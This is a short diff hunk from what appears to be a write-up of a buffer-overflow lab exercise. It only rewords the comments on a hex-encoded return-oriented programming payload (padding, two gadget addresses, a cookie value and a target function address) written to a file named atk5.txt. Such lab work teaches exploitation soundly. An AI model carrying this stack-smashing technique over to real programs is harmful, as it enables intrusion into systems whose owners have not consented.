@@ -781,9 +781,9 @@ Now we can use these 2 gabgets to create our file `atk5.txt`
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00            /* padding */
-13 5b 55 55 55 55 00 00            /* gadget 1 */
-4e d7 5b 5f 00 00 00 00            /* cookie to be popped into %rax */
-24 5b 55 55 55 55 00 00            /* gadget 2 */
+13 5b 55 55 55 55 00 00            /* gadget 1 address */
+4e d7 5b 5f 00 00 00 00            /* cookie popped into %rax */
+24 5b 55 55 55 55 00 00            /* gadget 2 address */
 93 59 55 55 55 55 00 00            /* touch2 address */
 ```
 
